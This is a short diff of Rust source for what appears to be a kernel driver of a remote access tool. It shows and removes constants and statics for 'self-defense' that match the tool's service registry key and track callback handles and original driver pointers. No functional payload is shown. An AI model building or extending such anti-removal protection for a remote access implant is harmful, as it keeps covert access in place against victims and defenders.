@@ -1,6 +1,6 @@
 use core::ffi::c_void;
 use core::ptr;
-use core::sync::atomic::{AtomicBool, AtomicI64, AtomicPtr};
+use core::sync::atomic::{AtomicBool, AtomicPtr};
 
 use aho_corasick::AhoCorasick;
 use const_format::formatcp;
@@ -12,13 +12,6 @@ pub const MAX_INITIALIZE_ATTEMPTS: usize = 50;
 pub const RAT_CLIENT_SERVICE_REGISTRY: &U16CStr = u16cstr!(formatcp!(
     "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\{RAT_CLIENT_SERVICE_NAME}"
 ));
-
-/// Self-defense pattern to construct the Aho-Corasick automaton.
-///
-/// For self-defense, we may receive either `\CurrentControlSet\` or `\ControlSet001\` in the callback, so
-/// we need to match any of them.
-pub const RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE: &U16CStr =
-    u16cstr!(formatcp!("\\Services\\{RAT_CLIENT_SERVICE_NAME}"));
 
 /// Self-defense pattern to construct the Aho-Corasick automaton.
 ///
@@ -49,9 +42,5 @@ pub static SELF_DEFENSE_ACTIVATED: AtomicBool = AtomicBool::new(false);
 
 pub static OBJ_PATH_AHO_CORASICK: AtomicPtr<AhoCorasick> = AtomicPtr::new(ptr::null_mut());
 pub static OB_REGISTER_CALLBACKS_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
-pub static SERVICE_REGISTRY_AHO_CORASICK: AtomicPtr<AhoCorasick> = AtomicPtr::new(ptr::null_mut());
-pub static CM_REGISTER_CALLBACK_COOKIE: AtomicI64 = AtomicI64::new(0);
 
 pub static ORIGINAL_DRIVER_OBJECT: AtomicPtr<DRIVER_OBJECT> = AtomicPtr::new(ptr::null_mut());
-pub static ORIGINAL_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
-pub static ORIGINAL_DRIVER_ENTRY_COMPLETED: AtomicBool = AtomicBool::new(false);
